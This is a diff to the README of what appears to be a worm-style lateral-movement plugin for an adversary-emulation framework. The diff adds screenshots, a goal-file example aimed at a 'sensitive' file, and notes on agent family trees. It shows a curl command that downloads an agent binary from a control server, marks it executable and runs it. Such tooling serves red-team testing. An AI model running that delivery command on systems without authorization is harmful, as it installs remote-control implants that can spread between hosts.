@@ -75,12 +75,14 @@ Furthermore:
   
 These last two points could be added in future.
 
-![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm1.png)
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm1.png "worm-operation start menu")
 
 ### Note 1: don't be misled by the name worm-operation!
 
 This new type of operation can be used for any type of adversary profile, even those that do not perform lateral movements!
 It's just a different logical approach to executing an adversary profile.
+
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm2.png)
 
 ### Note 2: build the 'agents family tree'
 
@@ -88,6 +90,10 @@ To build the 'agents family tree' it is necessary to add to the delivery command
 ```
 do curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' #{server}/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server #{server} -group #{group} -father #{paw};
 ```
+
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/worm3.png)
+
+(Note: if the father parameter is used correctly there should never be an orphan agent)
 
 ## WORM-PLANNERS
 
@@ -115,7 +121,25 @@ An agent that satisfies the goal is called <b>goal-agent</b>.
 Since the host-facts depend on the abilities, an adversary's profile is associated with each goal.
 Obviously different goals can be created for the same adversary profile.
 
-It is possible to create goals either through the GUI or by loading the .yml file in the data/goals folder.
+It is possible to create goals either through the GUI or by loading the .yml file in the data/goals folder:
+File .yml example:
+```
+id: 89da1673-184d-4509-a53a-e4a3b4a06c2e
+name: find-file
+description: specific file in linux agents
+adversary: 1a98b8e6-18ce-4617-8cc5-e65a1a9d490e
+clauses:
+  1:
+  - {name: platform, type: property, value: linux}
+  2:
+  - {name: host.file.sensitive, type: host-fact, value: /home/test.txt}
+```
+
+GUI example:
+
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/goal.png)
+
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/goal2.png "Add new literal")
 
 ## REPORT
 
@@ -124,6 +148,8 @@ Even for worm-operations it is possible to download (and view by GUI) the report
 * <b>policy</b>: if the worm-operation had a goal, it shows the chosen policy - stop at the first goal-agents / expand until it is possible.
 * <b>goal-agents</b>: percentage of goal-agents and list of their paw.
 
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/report.png)
+
 ## Additional features for AGENTS
 
 Once a worm-operation is finished, it is possible to see the list of the agents which participated and which of them are goal-agents.
@@ -131,3 +157,5 @@ Once a worm-operation is finished, it is possible to see the list of the agents 
 It is also possible:
 * compare the results of a finished worm-operation with other goals - associated with the same adversary profile executed.
 * split easily the <b>goal-agents</b> from the <b>no-goal-agents</b> that participated in an worm-operation into distinct groups.
+
+![alt text](https://github.com/EmilioPanti/worm/blob/master/docs/img/agent.png)
